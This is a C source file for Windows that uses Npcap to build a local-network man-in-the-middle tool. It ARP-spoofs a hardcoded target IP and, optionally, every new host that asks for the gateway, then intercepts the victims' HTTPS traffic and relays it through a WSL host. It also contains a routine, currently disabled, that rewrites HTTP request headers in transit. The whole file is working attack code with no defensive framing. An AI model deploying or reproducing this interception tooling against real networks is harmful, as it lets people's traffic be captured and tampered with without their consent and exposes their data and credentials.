#include "pcap.h"
#include "ntddndis.h"
#include "iphlpapi.h"
#include "signal.h"
#include "tchar.h"
#include "packet.h"
#include "spoof.h"
#include "globals.h"

// System Specific
HANDLE hBackwardThread, hForwardThread;
BOOL LoadNpcapDlls()
{
    _TCHAR npcap_dir[512];
    UINT len;
    len = GetSystemDirectory(npcap_dir, 480);
    if (!len)
    {
        fprintf(stderr, "Error in GetSystemDirectory: %x", GetLastError());
        return FALSE;
    }
    _tcscat_s(npcap_dir, 512, _T("\\Npcap"));
    if (SetDllDirectory(npcap_dir) == 0)
    {
        fprintf(stderr, "Error in SetDllDirectory: %x", GetLastError());
        return FALSE;
    }
    return TRUE;
}

// Statics

BOOL enableAutoSpoof = FALSE;

// Logics

void init_addrs();
void on_sig_int(int sig);
void manual_setup_spoof(uint32_t targetIp);
void enable_auto_spoof(BOOL value) { enableAutoSpoof = value; }

void run_forward_loop();
void run_backward_loop();
void forward_loop_handler(unsigned char *argument, const struct pcap_pkthdr *packet_heaher, const unsigned char *packet_content);
void backward_loop_handler(unsigned char *argument, const struct pcap_pkthdr *packet_heaher, const unsigned char *packet_content);

typedef struct
{
    pcap_t *wlanDevice;
    pcap_t *vEtherDevice;
} PcapChannel;
PcapChannel forwardChannel, backwardChannel;
int main(int argc, char **argv)
{
    char errbuf[PCAP_BUF_SIZE];

    if (!LoadNpcapDlls())
    {
        printf("Failed to load Npcap!");
        exit(1);
    }

    init_addrs();

    forwardChannel.vEtherDevice = pcap_open(VETHER_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
    backwardChannel.vEtherDevice = pcap_open(VETHER_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
    if (forwardChannel.vEtherDevice == NULL || backwardChannel.vEtherDevice == NULL)
    {
        LOG("Failed:%s\n", errbuf)
        exit(1);
    }

    manual_setup_spoof(inet_addr("192.168.43.11"));
    forwardChannel.wlanDevice = pcap_open(WLAN_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
    backwardChannel.wlanDevice = pcap_open(WLAN_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
    if (forwardChannel.wlanDevice == NULL || backwardChannel.wlanDevice == NULL)
    {
        LOG("Failed:%s\n", errbuf)
        exit(1);
    }
    // pcap_dumper_t *dumpDevice = pcap_dump_open(mainDevice, "dump.pcap");

    run_forward_loop();
    run_backward_loop();
    LOG("Capture started");

    signal(SIGINT, on_sig_int);

    Sleep(INFINITE);
}

void init_addrs()
{
    FILE *wslIpFile = fopen("wslip.txt", "r");
    char ipStr[1024];
    memset(ipStr, 0, sizeof ipStr);
    while (strcmp("src", ipStr) != 0)
        fscanf(wslIpFile, "%s", ipStr);
    fscanf(wslIpFile, "%s", ipStr);
    ipWsl = inet_addr(ipStr);
    fclose(wslIpFile);

    PIP_ADAPTER_INFO pAdapterInfo;

    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
    if (pAdapterInfo == NULL)
    {
        LOG("Error allocating memory needed to call GetAdaptersinfo\n");
        exit(1);
    }
    // Make an initial call to GetAdaptersInfo to get
    // the necessary size into the ulOutBufLen variable
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW)
    {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
        if (pAdapterInfo == NULL)
        {
            LOG("Error allocating memory needed to call GetAdaptersinfo\n");
            exit(1);
        }
    }

    DWORD dwRetVal;
    if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR)
    {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter)
        {
            if (strstr(WLAN_DEVICE_NAME, pAdapter->AdapterName) != NULL)
            {
                ipAddr = inet_addr(pAdapter->IpAddressList.IpAddress.String);
                gateAddr = inet_addr(pAdapter->GatewayList.IpAddress.String);
                for (int i = 0; i < pAdapter->AddressLength; i++)
                {
                    localMacAddr[i] = pAdapter->Address[i];
                }
                ULONG size = 6;
                SendARP(gateAddr, ipAddr, gateMacAddr, &size);

                if (size != 6)
                {
                    LOG("Failed to obtain Mac Addresses!")
                    exit(1);
                }
                LOG("Mac Addresses:\nLocal:%.2x%.2x%.2x%.2x%.2x%.2x\nGate:%.2x%.2x%.2x%.2x%.2x%.2x",
                    localMacAddr[0], localMacAddr[1], localMacAddr[2], localMacAddr[3], localMacAddr[4], localMacAddr[5],
                    gateMacAddr[0], gateMacAddr[1], gateMacAddr[2], gateMacAddr[3], gateMacAddr[4], gateMacAddr[5])
            }
            else if (strstr(VETHER_DEVICE_NAME, pAdapter->AdapterName) != NULL)
            {
                ipWslHost = inet_addr(pAdapter->IpAddressList.IpAddress.String);
                for (int i = 0; i < pAdapter->AddressLength; i++)
                {
                    wslHostAddr[i] = pAdapter->Address[i];
                }
                ULONG size = 6;
                SendARP(ipWsl, ipWslHost, wslAddr, &size);

                if (size != 6)
                {
                    LOG("Failed to obtain Mac Addresses!")
                    exit(1);
                }
                LOG("vEthernet Mac Addresses:\nLocal:%.2x%.2x%.2x%.2x%.2x%.2x\nWSL:%.2x%.2x%.2x%.2x%.2x%.2x",
                    wslHostAddr[0], wslHostAddr[1], wslHostAddr[2], wslHostAddr[3], wslHostAddr[4], wslHostAddr[5],
                    wslAddr[0], wslAddr[1], wslAddr[2], wslAddr[3], wslAddr[4], wslAddr[5])
            }
            pAdapter = pAdapter->Next;
        }
    }
    else
    {
        LOG("GetAdaptersInfo failed with error: %d\n", dwRetVal);
        exit(1);
    }

    if (pAdapterInfo)
        free(pAdapterInfo);
}

void handleHttp(pcap_t *device, TcpPacket *tcpPacket, uint16_t len)
{
    if (!len)
        return;
    uint8_t *payload = tcpPacket->payload;
    char *pos = NULL;
    if (pos = strstr(payload, "Upgrade-Insecure-Requests"))
    {
        uint8_t *lineEnd = (uint8_t *)strstr(pos, "\r\n"); // It should always be
        if (*(lineEnd - 1) == '1')                         // found
        {
            TcpPacket *newPacket = malloc(sizeof(TcpPacket) + len);
            memcpy(newPacket, tcpPacket, sizeof(TcpPacket));
            memcpy(newPacket->payload, payload, len);
            memcpy(newPacket->ether.ether_dhost, gateMacAddr, 6);
            *(newPacket->payload + (lineEnd - payload) - 1) = '0';
            newPacket->tcp.checksum = TcpChecksum(newPacket);
            pcap_sendpacket(device, (const uint8_t *)newPacket, sizeof(TcpPacket) + len);
            free(newPacket);
        }
    }
    else
    {
        pcap_sendpacket(device, (const uint8_t *)tcpPacket, sizeof(TcpPacket) + len);
    }
    return;
}

bool isMacSpoofed(const uint8_t *mac)
{
    for (int i = 0; i < spoofedTop; i++)
    {
        if (memcmp(mac, spoofedMachines[i].MacAddress, 6) == 0)
        {
            return true;
        }
    }
    return false;
}
int findSpoofedMachine(const uint32_t ip)
{
    for (int i = 0; i < spoofedTop; i++)
    {
        uint32_t addr = spoofedMachines[i].IpAddress;
        if (ip == addr)
        {
            return i;
        }
    }
    return -1;
}

void forward_loop_handler(unsigned char *argument, const struct pcap_pkthdr *packet_header, const unsigned char *packet_content)
{
    pcap_t *retransmitDevice = forwardChannel.vEtherDevice;
    pcap_t *mainDevice = forwardChannel.wlanDevice;

    // u_char *dumpDevice = argument;
    const EthernetPacket *ethPacket = NULL;
    ethPacket = (EthernetPacket *)packet_content;
    if (!memcmp(ethPacket->header.ether_shost, localMacAddr, MACADDR_LEN)) // Packet sent by us
    {
        // ignore it
        return;
    }

    uint32_t arp = ntohs(0x0806);
    uint32_t ipv4 = ntohs(0x0800);
    if (ethPacket->header.ether_type == arp) // arp
    {
        ArpPacket *arpPacket = (ArpPacket *)ethPacket;
        if (enableAutoSpoof && arpPacket->arp.ar_op == 1 && memcmp(&arpPacket->arp.ar_sha, localMacAddr, 6)) // request
        {
            if (arpPacket->arp.ar_tip == gateAddr)
            // We got an newbie, spoof it
            {
                CreateSpoofThread(arpPacket->arp.ar_sha, arpPacket->arp.ar_sip);
                return;
            }
        }
    }
    else if (ethPacket->header.ether_type == ipv4) // IPv4
    {
        Ipv4Packet *ipv4Packet = (Ipv4Packet *)ethPacket;
        if (ipv4Packet->ipv4.proto == 6) // TCP
        {
            TcpPacket *tcpPacket = (TcpPacket *)ethPacket;
            uint16_t sourcePort = ntohs(tcpPacket->tcp.src_port);
            uint16_t destPort = ntohs(tcpPacket->tcp.dst_port);
            if (sourcePort == 80 || destPort == 80) // HTTP
            {
                // pcap_dump(dumpDevice, packet_header, packet_content);
                uint16_t len = ntohs(ipv4Packet->ipv4.len) - sizeof(ipv4Packet->ipv4) - (tcpPacket->tcp.data_off_set >> 4 << 2);
                // uint16_t checksum = TcpChecksum(tcpPacket);
                // uint16_t ipchecksum = Ipv4Checksum(ipv4Packet);
                // handleHttp(tcpPacket, len);
                return;
            }
            if (destPort == 443) // HTTPS
            {
                // pcap_dump(dumpDevice, packet_header, packet_content);
                uint8_t *pkt = malloc(packet_header->len);
                memcpy(pkt, packet_content, packet_header->len);
                TcpPacket *modified = (TcpPacket *)pkt;
                memcpy(modified->ether.ether_shost, wslHostAddr, MACADDR_LEN);
                memcpy(modified->ether.ether_dhost, wslAddr, MACADDR_LEN);
                modified->ipv4.dst = ipWsl;
                modified->ipv4.checksum = Ipv4Checksum((Ipv4Packet *)modified);
                modified->tcp.checksum = TcpChecksum(modified);
                int res = pcap_sendpacket(retransmitDevice, pkt, packet_header->len);
                free(pkt);
            }
        }
    }
    if (isMacSpoofed(ethPacket->header.ether_shost))
    {
        uint8_t *pkt = malloc(packet_header->len);
        memcpy(pkt, packet_content, packet_header->len);
        pcap_sendpacket(mainDevice, pkt, packet_header->len);
        free(pkt);
    }
}
void backward_loop_handler(unsigned char *argument, const struct pcap_pkthdr *packet_header, const unsigned char *packet_content)
{
    const EthernetPacket *ethPacket = NULL;
    ethPacket = (EthernetPacket *)packet_content;
    if (!memcmp(ethPacket->header.ether_shost, wslHostAddr, MACADDR_LEN)) // Packet sent by us
    {
        // ignore it
        return;
    }

    uint32_t arp = ntohs(0x0806);
    uint32_t ipv4 = ntohs(0x0800);
    if (ethPacket->header.ether_type == ipv4) // IPv4
    {
        Ipv4Packet *ipv4Packet = (Ipv4Packet *)ethPacket;
        if (ipv4Packet->ipv4.proto == 6) // TCP
        {
            TcpPacket *tcpPacket = (TcpPacket *)ethPacket;
            uint16_t sourcePort = ntohs(tcpPacket->tcp.src_port);
            uint16_t destPort = ntohs(tcpPacket->tcp.dst_port);
            if (sourcePort == 80 || destPort == 80) // HTTP
            {
                // pcap_dump(dumpDevice, packet_header, packet_content);
                uint16_t len = ntohs(ipv4Packet->ipv4.len) - sizeof(ipv4Packet->ipv4) - (tcpPacket->tcp.data_off_set >> 4 << 2);
                // uint16_t checksum = TcpChecksum(tcpPacket);
                // uint16_t ipchecksum = Ipv4Checksum(ipv4Packet);
                // handleHttp(tcpPacket, len);
                return;
            }
            int index = -1;
            if (sourcePort == 443 && (index = findSpoofedMachine(ipv4Packet->ipv4.dst)) != -1) // HTTPS
            {
                // pcap_dump(dumpDevice, packet_header, packet_content);
                uint8_t *pkt = malloc(packet_header->len);
                memcpy(pkt, packet_content, packet_header->len);
                TcpPacket *modified = (TcpPacket *)pkt;
                memcpy(modified->ether.ether_shost, localMacAddr, MACADDR_LEN);
                memcpy(modified->ether.ether_dhost, spoofedMachines[index].MacAddress, MACADDR_LEN);
                modified->ipv4.src = gateAddr;
                modified->ipv4.checksum = Ipv4Checksum((Ipv4Packet *)modified);
                modified->tcp.checksum = TcpChecksum(modified);
                int res = pcap_sendpacket(backwardChannel.wlanDevice, pkt, packet_header->len);
                free(pkt);
            }
        }
    }
}

unsigned long forward_thread_proc(void *arg)
{
    int res = 0;
    struct pcap_pkthdr *hdr;
    const u_char *pktdata;
    while (res = pcap_next_ex(forwardChannel.wlanDevice, &hdr, &pktdata) >= 0 && !exitFlag)
    {
        forward_loop_handler(NULL, hdr, pktdata);
    }
}
void run_forward_loop()
{
    DWORD threadId;
    hForwardThread = CreateThread(NULL, 0, forward_thread_proc, NULL, 0, &threadId);
    if (!hForwardThread)
    {
        LOG("Error:Create forward thread failed!");
        exit(1);
    }
}
unsigned long backward_thread_proc(void *arg)
{
    int res = 0;
    struct pcap_pkthdr *hdr;
    const u_char *pktdata;
    while (res = pcap_next_ex(backwardChannel.vEtherDevice, &hdr, &pktdata) >= 0 && !exitFlag)
    {
        backward_loop_handler(NULL, hdr, pktdata);
    }
}
void run_backward_loop()
{
    DWORD threadId;
    hBackwardThread = CreateThread(NULL, 0, backward_thread_proc, NULL, 0, &threadId);
    if (!hBackwardThread)
    {
        LOG("Error:Create backward thread failed!");
        exit(1);
    }
}

void manual_setup_spoof(uint32_t targetIp)
{
    ULONG size = 6;
    char targetMac[6];
    SendARP(targetIp, ipAddr, targetMac, &size);

    if (size != 6)
    {
        struct in_addr addr;
        addr.s_addr = targetIp;
        LOG("Failed to obtain Mac Addresses for target ip %s", inet_ntoa(addr))
        return;
    }

    CreateSpoofThread(targetMac, targetIp);
}

void on_sig_int(int sig)
{
    exitFlag = true;
    printf("Shutting down...");

    ShutdownSpoofThreads();

    WaitForSingleObject(hForwardThread, -1);
    WaitForSingleObject(hBackwardThread, -1);

    pcap_close(forwardChannel.vEtherDevice);
    pcap_close(backwardChannel.vEtherDevice);
    pcap_close(forwardChannel.wlanDevice);
    pcap_close(backwardChannel.wlanDevice);

    exit(0);
}